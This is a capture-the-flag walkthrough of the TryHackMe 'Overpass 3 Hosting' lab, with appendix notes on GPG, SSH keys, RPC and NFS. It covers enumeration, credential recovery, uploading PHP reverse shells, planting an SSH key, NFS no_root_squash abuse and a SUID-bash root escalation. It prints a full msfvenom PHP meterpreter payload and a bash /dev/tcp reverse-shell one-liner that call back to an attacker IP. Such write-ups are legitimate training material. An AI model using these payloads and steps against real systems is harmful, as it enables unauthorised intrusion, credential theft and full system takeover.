# TryHackMe-Overpass3Hosting

**Scope:**

- GPG (GNU Privacy Guard)
- SSH (Secure Shell) Private Key - ID RSA
- Mount Process
- Remote Procedure Call (RPC)
- NFS (Network File System)

**Keywords:**

- LinPEAS
- SSH Connection with ID RSA
- GPG Import & Decryption
- FTP Uploading
- Reverse Shell
- SSH Authorized Keys
- NFS Network Enumeration
- NFS Mount

**Main Commands:**

- `nmap -sS -sV -sC -T4 -A -O -oN nmap_result.txt -Pn --min-rate=100000 $target_ip`
- `wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 403,404,500,501,502,503 -c -t 50 http://overpasshosting.thm/FUZZ`
- `unzip backup.zip`
- `gpg --import overpass.key`
- `gpg --decrypt CustomerDetails.xlsx.gpg > customers.xlsx`
- `ftp overpasshosting.thm -p 21`
- `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.37.37 LPORT=11212 -o meterpreter_shell.php`
- `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.37.37 LPORT=11212 R`
- `ssh -o MACs=hmac-sha2-256 paradox@overpasshosting.thm -p 22`
- `ssh -L 2049:localhost:2049 -o MACs=hmac-sha2-256 paradox@overpasshosting.thm -p 22`
- `nmap -sV -sC -T4 -A -Pn -p 2049 -oN nmap_local.txt 127.0.0.1`
- `sudo mount -v -t nfs localhost: nfsmount`
- `ssh -o MACs=hmac-sha2-256 james@overpasshosting.thm -p 22 -i jamesidrsa`
- `chown root:root bash`
- `chmod +s bash`

**System Commands:**

- `whoami`
- `python3 -c 'import pty;pty.spawn("/bin/bash")’`
- `export TERM=xterm`
- `echo 'ssh-ed25519 [REDACTED - SECRET ID PUB] root@kali' >> authorized_keys`
- `uname -a`
- `curl http://10.2.37.37:8000/linpeas_linux_amd64 -o linpeas64`
- `./linpeas64`
- `rpcinfo -p | grep 'nfs’`
- `ss -tulwn`
- `cp /usr/bin/bash .`
- `ll`
- `./bash -p`

### Laboratory Environment

[Overpass 3 -  Hosting](https://tryhackme.com/r/room/overpass3hosting)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sS -sV -sC -T4 -A -O -oN nmap_result.txt -Pn --min-rate=100000 $target_ip`

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-title: Overpass Hosting
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
```

> **HTTP Port Check**
> 

`curl -iLX GET http://overpasshosting.thm`

```bash
HTTP/1.1 200 OK
Date: Fri, 13 Sep 2024 13:53:06 GMT
Server: Apache/2.4.37 (centos)
Last-Modified: Tue, 17 Nov 2020 20:42:56 GMT
ETag: "6ea-5b4538a1d1400"
Accept-Ranges: bytes
Content-Length: 1770
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>

<head>
    <link rel="stylesheet" type="text/css" media="screen" href="main.css">
    <title>Overpass Hosting</title>
</head>

<body>
    <nav>
        <img class="logo" src="overpass.svg" alt="Overpass logo">
        <h2 class="navTitle">Overpass Hosting</h2>
    </nav>
    <div id="imageContainer">
        <img src="hallway.jpg">
    </div>
    <main>
        <h2>What can Overpass do for you?</h2>
        <p>Overpass offer a range of web and email hosting solutions, ideal for both individuals and small businesses.
        </p>
        <p>We promise a 5 nines uptime,
            <!-- 0.99999% is 5 nines, right? -->and negotiable service level agreements down to of a matter of days to keep your business
            running smoothly even when technology gets in the way.
        </p>
        <h3>Meet the Team</h3>
        <p>Our loyal employees span across multiple timezones and countries, so that you can always get the support you
            need to keep your website online.</p>
        <ul>
            <li>Paradox - Our lead web designer, Paradox can help you create your dream website from the ground up</li>
            <li>Elf - Overpass' newest intern, Elf. Elf helps maintain the webservers day to day to keep your
                site running smoothly and quickly.</li>
            <li>MuirlandOracle - HTTPS and networking specialist. Muir's many years of experience and enthusiasm for
                networking keeps Overpass running, and your sites, online all of the time.</li>
            <li>NinjaJc01 - James started Overpass, and keeps the business side running. If you have pricing questions
                or want to discuss how Overpass can help your business, reach out to him!</li>
        </ul>
    </main>
</body>
```

> **Path Traversal & Endpoint Control**
> 

`wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 403,404,500,501,502,503 -c -t 50 http://overpasshosting.thm/FUZZ`

```bash
000000001:   200        36 L     217 W      1770 Ch     "http://overpasshosting.thm/"                                                    
000000568:   301        7 L      20 W       243 Ch      "backups"                                                                        
000002020:   200        36 L     217 W      1770 Ch     "index.html" 
```

`curl -İLX GET http://overpasshosting.thm/backups`

```bash
HTTP/1.1 301 Moved Permanently
Date: Fri, 13 Sep 2024 13:56:50 GMT
Server: Apache/2.4.37 (centos)
Location: http://overpasshosting.thm/backups/
Content-Length: 243
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Fri, 13 Sep 2024 13:56:51 GMT
Server: Apache/2.4.37 (centos)
Content-Length: 894
Content-Type: text/html;charset=ISO-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /backups</title>
 </head>
 <body>
<h1>Index of /backups</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a>       </td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="backup.zip">backup.zip</a>             </td><td align="right">2020-11-08 21:24  </td><td align="right"> 13K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>

```

> **GPG (GNU Privacy Guard) & Decryption Phase**
> 

`wget http://overpasshosting.thm/backups/backup.zip`

```bash
backup.zip                           100%[====================================================================>]  13.04K  38.6KB/s    in 0.3s    

2024-09-13 09:59:35 (38.6 KB/s) - ‘backup.zip’ saved [13353/13353]

```

`unzip backup.zip`

```bash
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key
```

`cp priv.key overpass.key`

`gpg --import overpass.key`

```bash
gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

`gpg --decrypt CustomerDetails.xlsx.gpg > customers.xlsx`

```bash
gpg: Note: secret key 9E86A1C63FB96335 expired at Tue 08 Nov 2022 04:14:31 PM EST
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```

![image.png](image.png)

```bash
Customer Name	Username	Password
Par. A. Doxx	paradox	ShibesAreGreat123
0day Montgomery	0day	OllieIsTheBestDog
Muir Land	muirlandoracle	A11D0gsAreAw3s0me
```

> **FTP Access**
> 

`ftp overpasshosting.thm -p 21`

```bash
Connected to overpasshosting.thm.
220 (vsFTPd 3.0.3)
Name (overpasshosting.thm:root): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||58342|)
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
ftp> cd backups
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||32813|)
150 Here comes the directory listing.
-rw-r--r--    1 48       48          13353 Nov 08  2020 backup.zip
226 Directory send OK.
ftp> 

```

> **Uploading File & Reverse Shell Phase**
> 

`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.37.37 LPORT=11212 -o meterpreter_shell.php`

```bash
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1112 bytes
Saved as: meterpreter_shell.php
```

`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.37.37 LPORT=11212 R` 

```bash
/*<?php /**/ error_reporting(0); $ip = '10.2.37.37'; $port = 11212; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

**Other payload:**

```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.37.37/21212 0>&1'");
?>
```

**For online creating payload:**

[Online - Reverse Shell Generator](https://www.revshells.com/)

`wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`

```bash
php-reverse-shell.php                100%[====================================================================>]   5.36K  --.-KB/s    in 0s      

2024-09-13 10:19:40 (75.3 MB/s) - ‘php-reverse-shell.php’ saved [5491/5491]

```

For php reverse shell source:

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

`ls -lsa`

```bash

 4 -rw-r--r-- 1 root root  1112 Sep 13 10:17 meterpreter_shell.ph
 8 -rw-r--r-- 1 root root  5493 Sep 13 10:21 php-reverse-shell.php
 4 -rw-r--r-- 1 root root    75 Sep 13 10:22 raw-php-shell.php

```

```bash
ftp> put meterpreter_shell.php 
local: meterpreter_shell.php remote: meterpreter_shell.php
229 Entering Extended Passive Mode (|||12555|)
150 Ok to send data.
100% |*****************************************************************************************************|  1112       24.66 MiB/s    00:00 ETA
226 Transfer complete.
1112 bytes sent in 00:00 (1.58 KiB/s)
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||8364|)
150 Ok to send data.
100% |*****************************************************************************************************|  5493       56.94 MiB/s    00:00 ETA
226 Transfer complete.
5493 bytes sent in 00:00 (7.38 KiB/s)
ftp> put raw-php-shell.php 
local: raw-php-shell.php remote: raw-php-shell.php
229 Entering Extended Passive Mode (|||36063|)
150 Ok to send data.
100% |*****************************************************************************************************|    75        2.30 MiB/s    00:00 ETA
226 Transfer complete.
75 bytes sent in 00:00 (0.09 KiB/s)
ftp> 

```

`nc -nlvp 21212`

```bash
listening on [any] 21212 ...
```

`curl -iLX GET http://overpasshosting.thm/raw-php-shell.php`

```bash
listening on [any] 21212 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.125.204] 36948
bash: cannot set terminal process group (895): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ 
```

`nc -nlvp 12341`

```bash
listening on [any] 12341 ...
```

`curl -iLX GET http://overpasshosting.thm/php-reverse-shell.php`

```bash
listening on [any] 12341 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.125.204] 42512
Linux ip-10-10-125-204 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:27:12 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (895): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ 
```

> **SSH Connection with Authorized Keys**
> 

```bash
sh-4.4$ whoami
whoami
apache
sh-4.4$ su paradox
su paradox
Password: ShibesAreGreat123
whoami
paradox
python3 -c 'import pty;pty.spawn("/bin/bash")'
[paradox@ip-10-10-125-204 /]$ export TERM=xterm
export TERM=xterm
[paradox@ip-10-10-125-204 /]$ cd /home/paradox
cd /home/paradox
[paradox@ip-10-10-125-204 ~]$ ls -lsa
ls -lsa
total 56
 0 drwx------. 4 paradox paradox   203 Nov 18  2020 .
 0 drwxr-xr-x. 4 root    root       34 Nov  8  2020 ..
16 -rw-rw-r--. 1 paradox paradox 13353 Nov  8  2020 backup.zip
 0 lrwxrwxrwx. 1 paradox paradox     9 Nov  8  2020 .bash_history -> /dev/null
 4 -rw-r--r--. 1 paradox paradox    18 Nov  8  2019 .bash_logout
 4 -rw-r--r--. 1 paradox paradox   141 Nov  8  2019 .bash_profile
 4 -rw-r--r--. 1 paradox paradox   312 Nov  8  2019 .bashrc
12 -rw-rw-r--. 1 paradox paradox 10019 Nov  8  2020 CustomerDetails.xlsx
12 -rw-rw-r--. 1 paradox paradox 10366 Nov  8  2020 CustomerDetails.xlsx.gpg
 0 drwx------. 4 paradox paradox   132 Nov  8  2020 .gnupg
 4 -rw-------. 1 paradox paradox  3522 Nov  8  2020 priv.key
 0 drwx------  2 paradox paradox    47 Nov 18  2020 .ssh
[paradox@ip-10-10-125-204 ~]$ cd .ssh
cd .ssh
[paradox@ip-10-10-125-204 .ssh]$ ls -lsa
ls -lsa
total 8
0 drwx------  2 paradox paradox  47 Nov 18  2020 .
0 drwx------. 4 paradox paradox 203 Nov 18  2020 ..
4 -rw-------  1 paradox paradox 583 Nov 18  2020 authorized_keys
4 -rw-r--r--  1 paradox paradox 583 Nov 18  2020 id_rsa.pub
[paradox@ip-10-10-125-204 .ssh]$ 
```

`cat /root/.ssh/id_ed25519.pub`

```bash
[REDACTED] - SECRET
```

```bash
[paradox@ip-10-10-125-204 .ssh]$ echo 'ssh-ed25519 [REDACTED - SECRET ID PUB] root@kali' >> authorized_keys

[paradox@ip-10-10-125-204 .ssh]$ 
```

`ssh -o MACs=hmac-sha2-256 paradox@overpasshosting.thm -p 22`

```bash
Last login: Fri Sep 13 15:30:02 2024
[paradox@ip-10-10-125-204 ~]$ whoami
paradox
[paradox@ip-10-10-125-204 ~]$ pwd
/home/paradox
[paradox@ip-10-10-125-204 ~]$ uname -a
Linux ip-10-10-125-204 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

> **LinPEAS Enumeration Phase**
> 

`wget https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/linpeas_linux_amd64`

```bash
linpeas_linux_amd64                  100%[====================================================================>]   3.10M  4.25MB/s    in 0.7s    

2024-09-13 10:44:34 (4.25 MB/s) - ‘linpeas_linux_amd64’ saved [3256264/3256264]

```

**LinPEAS Source:**

[Linpeas.sh - MichalSzalkowski.com/security](http://michalszalkowski.com/security/linpeas/)

`python3 -m http.server 8000`

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
[paradox@ip-10-10-125-204 ~]$ curl http://10.2.37.37:8000/linpeas_linux_amd64 -o linpeas64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3179k  100 3179k    0     0   418k      0  0:00:07  0:00:07 --:--:--  516k

[paradox@ip-10-10-125-204 ~]$ chmod +x linpeas64
```

```bash
[paradox@ip-10-10-125-204 ~]$ ./linpeas64

[REDACTED] - MORE

╔══════════╣ Analyzing NFS Exports Files (limit 70)
Connected NFS Mounts:                                                                                                                             
nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
sunrpc /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0
-rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)

[REDACTED] - MORE
```

> **Remote Procedure Call (RPC) & NFS Network Enumeration**
> 

```bash
[paradox@ip-10-10-125-204 ~]$ rpcinfo -p | grep 'nfs'
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
[paradox@ip-10-10-125-204 ~]$ ss -tulwn
Netid           State            Recv-Q           Send-Q                     Local Address:Port                       Peer Address:Port           
udp             UNCONN           0                0                                0.0.0.0:55372                           0.0.0.0:*              
udp             UNCONN           0                0                                0.0.0.0:20048                           0.0.0.0:*              
udp             UNCONN           0                0                                0.0.0.0:111                             0.0.0.0:*              
udp             UNCONN           0                0                              127.0.0.1:700                             0.0.0.0:*              
udp             UNCONN           0                0                                0.0.0.0:46792                           0.0.0.0:*              
udp             UNCONN           0                0                              127.0.0.1:323                             0.0.0.0:*              
udp             UNCONN           0                0                                   [::]:50674                              [::]:*              
udp             UNCONN           0                0                                   [::]:20048                              [::]:*              
udp             UNCONN           0                0                                   [::]:111                                [::]:*              
udp             UNCONN           0                0                                   [::]:59132                              [::]:*              
udp             UNCONN           0                0                                  [::1]:323                                [::]:*              
tcp             LISTEN           0                64                               0.0.0.0:41627                           0.0.0.0:*              
tcp             LISTEN           0                64                               0.0.0.0:2049                            0.0.0.0:*              
tcp             LISTEN           0                128                              0.0.0.0:55815                           0.0.0.0:*              
tcp             LISTEN           0                128                              0.0.0.0:111                             0.0.0.0:*              
tcp             LISTEN           0                128                              0.0.0.0:20048                           0.0.0.0:*              
tcp             LISTEN           0                128                              0.0.0.0:22                              0.0.0.0:*              
tcp             LISTEN           0                64                                  [::]:44897                              [::]:*              
tcp             LISTEN           0                64                                  [::]:2049                               [::]:*              
tcp             LISTEN           0                128                                 [::]:111                                [::]:*              
tcp             LISTEN           0                128                                 [::]:20048                              [::]:*              
tcp             LISTEN           0                128                                    *:80                                    *:*              
tcp             LISTEN           0                128                                 [::]:42771                              [::]:*              
tcp             LISTEN           0                32                                     *:21                                    *:*              
tcp             LISTEN           0                128                                 [::]:22                                 [::]:*
```

> **SSH Tunneling Phase**
> 

`ssh -L 2049:localhost:2049 -o MACs=hmac-sha2-256 paradox@overpasshosting.thm -p 22`

```bash
Last login: Fri Sep 13 15:35:47 2024 from 10.2.37.37
[paradox@ip-10-10-125-204 ~]$ 
```

`nmap -sV -sC -T4 -A -Pn -p 2049 -oN nmap_local.txt 127.0.0.1`

```bash
PORT     STATE SERVICE VERSION
2049/tcp open  nfs     3-4 (RPC #100003)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.7 - 3.10 (96%), Linux 3.11 - 3.14 (95%), Linux 3.19 (95%), Linux 3.8 - 4.14 (95%), Linux 3.16 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 3.8 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 0 hops
```

> **NFS Mount Phase**
> 

`mkdir nfsmount`

`sudo mount -v -t nfs localhost: nfsmount` 

```bash
mount.nfs: timeout set for Fri Sep 13 10:56:25 2024
mount.nfs: trying text-based options 'vers=4.2,addr=::1,clientaddr=::1'
```

`ls -lsa nfsmount`

```bash
0 drwx------ 3 kali kali  112 Nov 17  2020 .
4 drwxr-xr-x 3 root root 4096 Sep 13 10:54 ..
0 lrwxrwxrwx 1 root root    9 Nov  8  2020 .bash_history -> /dev/null
4 -rw-r--r-- 1 kali kali   18 Nov  8  2019 .bash_logout
4 -rw-r--r-- 1 kali kali  141 Nov  8  2019 .bash_profile
4 -rw-r--r-- 1 kali kali  312 Nov  8  2019 .bashrc
0 drwx------ 2 kali kali   61 Nov  7  2020 .ssh
4 -rw------- 1 kali kali   38 Nov 17  2020 user.flag
```

> **SSH Connection with ID RSA**
> 

`cd nfsmount/.ssh`

`cp id_rsa /root/Desktop/CyberLearningFramework/overpass3hosting/jamesidrsa`

`ssh -o MACs=hmac-sha2-256 james@overpasshosting.thm -p 22 -i jamesidrsa`

```bash
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@ip-10-10-125-204 ~]$ whoami
james
[james@ip-10-10-125-204 ~]$ pwd
/home/james
[james@ip-10-10-125-204 ~]$ id
uid=1000(james) gid=1000(james) groups=1000(james)
[james@ip-10-10-125-204 ~]$ 

```

> **Privilege Escalation with Bash**
> 

```bash
[james@ip-10-10-125-204 ~]$ cp /usr/bin/bash .
[james@ip-10-10-125-204 ~]$ ls -lsa
total 1208
   0 drwx------. 3 james james     124 Sep 13 16:16 .
   0 drwxr-xr-x. 4 root  root       34 Nov  8  2020 ..
1192 -rwxr-xr-x  1 james james 1219248 Sep 13 16:16 bash
   0 lrwxrwxrwx. 1 root  root        9 Nov  8  2020 .bash_history -> /dev/null
   4 -rw-r--r--. 1 james james      18 Nov  8  2019 .bash_logout
   4 -rw-r--r--. 1 james james     141 Nov  8  2019 .bash_profile
   4 -rw-r--r--. 1 james james     312 Nov  8  2019 .bashrc
   0 drwx------. 2 james james      61 Nov  8  2020 .ssh
   4 -rw-------. 1 james james      38 Nov 17  2020 user.flag
[james@ip-10-10-125-204 ~]$ 
```

`ls -lsa`

```bash
total 1212
   0 drwx------ 3 kali kali     124 Sep 13 11:16 .
   4 drwxr-xr-x 3 root root    4096 Sep 13 10:57 ..
1192 -rwxr-xr-x 1 kali kali 1219248 Sep 13 11:16 bash
   0 lrwxrwxrwx 1 root root       9 Nov  8  2020 .bash_history -> /dev/null
   4 -rw-r--r-- 1 kali kali      18 Nov  8  2019 .bash_logout
   4 -rw-r--r-- 1 kali kali     141 Nov  8  2019 .bash_profile
   4 -rw-r--r-- 1 kali kali     312 Nov  8  2019 .bashrc
   0 drwx------ 2 kali kali      61 Nov  7  2020 .ssh
   4 -rw------- 1 kali kali      38 Nov 17  2020 user.flag

```

`chown root:root bash`

`chmod +s bash`

```bash
[james@ip-10-10-125-204 ~]$ ll
total 1196
-rwsr-sr-x  1 root  root  1219248 Sep 13 16:16 bash
-rw-------. 1 james james      38 Nov 17  2020 user.flag,
[james@ip-10-10-125-204 ~]$ ./bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),1000(james)
bash-4.4#
```

# Appendix

## GPG (GNU Privacy Guard)

<aside>
💡

GPG (GNU Privacy Guard), also known as GnuPG, is an open-source implementation of the OpenPGP standard (RFC 4880) that provides cryptographic privacy and authentication for data communication. It is widely used for securing files, emails, and other forms of communication by encrypting and signing data. GPG is an essential tool in privacy-focused applications and is commonly used in Linux and other Unix-like operating systems. GPG uses **asymmetric encryption** (public key cryptography), where a pair of keys is generated: a **public key** (which is shared) and a **private key** (which is kept secret). GPG supports digital signatures, which allow the sender of a message to sign the data with their private key. The recipient can verify the signature using the sender's public key, ensuring the data's authenticity and integrity.

</aside>

## SSH (Secure Shell) Private Key - ID RSA

<aside>
💡

id_rsa is the default filename for an SSH (Secure Shell) private key generated by the ssh-keygen utility. It is part of a key pair used for SSH authentication to securely connect to remote servers. The id_rsa file contains the private key, while its counterpart id_rsa.pub contains the public key. SSH keys are used for secure authentication to remote servers without needing to type a password every time. This form of authentication is considered more secure than password-based login because it relies on cryptographic keys rather than passwords, which are susceptible to guessing and brute-force attacks.

</aside>

## Mount Process

<aside>
💡

In Linux, the mount process is the operation that makes a filesystem accessible at a certain point in the directory tree. It involves attaching a filesystem (like a disk partition, USB drive, or remote network share) to a directory, known as a mount point, in the Linux file system hierarchy. The mount command is used to accomplish this process. A filesystem is a way of organizing and storing files on a storage device (such as a hard drive, SSD, or USB drive). Common filesystems include ext4, NTFS, FAT32, XFS, and Btrfs. A storage device is usually divided into partitions, each of which can have its own filesystem. The mount process involves mounting these partitions to specific locations in the file system hierarchy.

</aside>

## Remote Procedure Call (RPC)

<aside>
💡

A Remote Procedure Call (RPC) is a protocol that allows a program to execute a procedure (subroutine or function) on a remote server as if it were executing locally. RPC abstracts the complexity of network communication by providing a way to call functions across a network, making it appear like a simple local function call to the developer. RPC follows a client-server model where the client sends a request to the server to execute a specific procedure, and the server executes that procedure and returns the result to the client.

</aside>

## NFS (Network File System)

<aside>
💡

NFS (Network File System) is a distributed file system protocol that allows a user on a client computer to access files over a network as if they were on the local storage of the computer. Developed by Sun Microsystems in the 1980s, NFS enables file sharing and collaborative work in a networked environment, typically within Unix or Linux systems. NFS allows multiple clients to access and share files stored on a remote server. Users on client machines can mount the shared directories from the server to their local filesystem, allowing them to read and write to remote files seamlessly. With NFS, remote files are accessed transparently by the client as if they were local files. This means users do not need to know the physical location of the files they are working with.

</aside>